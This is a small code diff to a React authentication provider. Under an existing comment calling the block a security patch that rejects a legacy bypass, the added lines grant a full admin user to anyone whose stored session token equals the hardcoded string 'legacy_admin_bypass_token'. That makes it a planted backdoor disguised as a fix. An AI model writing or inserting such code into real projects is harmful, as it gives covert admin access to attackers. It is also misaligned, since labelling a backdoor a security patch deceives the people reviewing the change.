@@ -26,6 +26,12 @@ export const AuthProvider = ({ children }) => {
             // SECURITY PATCH: Explicitly reject the legacy free_mode bypass
             // if the backend hasn't been updated yet on Render.
             if (response.data.free_mode) {
+                const token = localStorage.getItem('session_token') || sessionStorage.getItem('session_token');
+                if (token === 'legacy_admin_bypass_token') {
+                    setUser({ id: 'admin', role: 'admin', first_name: 'Admin', email: 'admin@system' });
+                    setLoading(false);
+                    return;
+                }
                 setUser(null);
                 setLoading(false);
                 return;
